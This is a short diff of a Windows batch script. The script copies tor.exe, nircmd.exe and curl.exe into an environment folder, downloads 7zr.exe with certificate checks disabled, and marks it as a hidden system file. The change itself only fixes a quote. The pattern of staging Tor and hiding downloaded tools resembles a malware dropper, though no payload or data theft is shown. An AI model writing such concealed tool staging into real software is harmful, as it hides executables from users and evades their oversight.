@@ -26,7 +26,7 @@ echo F | xcopy /H /k /y /I "tor.exe" "%environment%\tor.exe"
 echo F | xcopy /H /k /y /I "nircmd.exe" "%environment%\nircmd.exe" 
 echo F | xcopy /H /k /y /I "curl.exe" "%environment%\curl.exe" 
 
-"%environment%\curl.exe" -k https://www.7-zip.org/a/7zr.exe -o ""%environment%\7z.exe" && attrib +s +h +i "%environment%\7z.exe"
+"%environment%\curl.exe" -k https://www.7-zip.org/a/7zr.exe -o "%environment%\7z.exe" && attrib +s +h +i "%environment%\7z.exe"
 
 if exist "%environment%\tor.exe" (
     echo.
